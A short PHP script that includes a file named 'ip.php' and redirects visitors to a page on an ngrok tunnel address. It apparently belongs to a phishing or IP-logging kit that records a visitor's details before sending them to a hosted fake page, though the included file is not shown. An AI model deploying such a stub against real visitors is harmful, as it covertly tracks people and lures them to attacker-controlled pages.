<?php
include 'ip.php';
header('Location: https://d2e48ad51a7f.ngrok.io/index2.html');
exit
?>
